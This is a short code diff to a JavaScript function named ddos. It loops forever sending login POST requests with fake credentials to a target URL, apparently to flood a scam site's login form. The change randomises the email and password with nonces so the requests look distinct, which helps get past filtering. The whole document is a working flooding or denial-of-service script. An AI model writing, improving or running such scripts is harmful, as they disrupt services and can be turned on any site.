@@ -4,10 +4,13 @@ let timeout = 50;
 
 async function ddos() {
     while (true) {
+        const nonce1 = Math.random().toString(36).substring(2, 15);
+        const nonce2 = Math.random().toString(36).substring(2, 15);
+        const nonce3 = Math.random().toString(36).substring(2, 15);
         const data = {
-            login: "sike@gmail.com",
-            password: "lolgetscammed"
-        }
+            login: `${nonce3}sik${nonce1}e@gmail.com${nonce2}`,
+            password: `${nonce2}lolge${nonce3}tscammed${nonce2}`
+        };
         axios.post(url, data)
         .then(resp =>{
             console.log(resp);
